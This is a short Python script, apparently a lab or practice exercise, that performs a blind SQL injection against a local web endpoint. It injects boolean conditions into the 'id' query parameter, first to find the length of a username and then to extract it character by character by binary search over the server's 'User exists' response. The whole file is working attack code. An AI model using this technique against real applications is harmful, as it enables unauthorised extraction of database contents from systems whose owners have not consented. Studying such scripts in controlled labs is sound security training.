import requests
import sys

url = "http://127.0.0.1:5000/blind"

if len(sys.argv) != 2:
	print("Usage: python3 blind_sqli.py <user_id>")
	sys.exit(1)

user_id = sys.argv[1]

request_count = 0
username = ""

# Find username length
username_length = None

for length in range(1, 21):

	payload = f"{user_id} AND LENGTH(username) = {length}"

	response = requests.get(url, params={"id": payload})
	request_count += 1

	if "User exists" in response.text:
		username_length = length
		print(f"Username length: {length}")
		break

if username_length is None:
	print("Could not determine username length.")
	sys.exit(1)

#Find each character using binary search
for position in range(1, username_length + 1):
	
	low = ord('a')
	high = ord('z')

	while low < high:
	
		mid = (low + high) //2
		character = chr(mid)

		payload = (f"{user_id} AND "f"SUBSTR(username, {position}, 1) > '{character}'")

		response = requests.get(url, params={"id": payload})
		request_count += 1

		if "User exists" in response.text:
			low = mid + 1
		else:
			high = mid

	character = chr(low)
	username += character

	print(f"Position {position}: {character}")

print(f"Username: {username}")
print(f"Total requests: {request_count}")

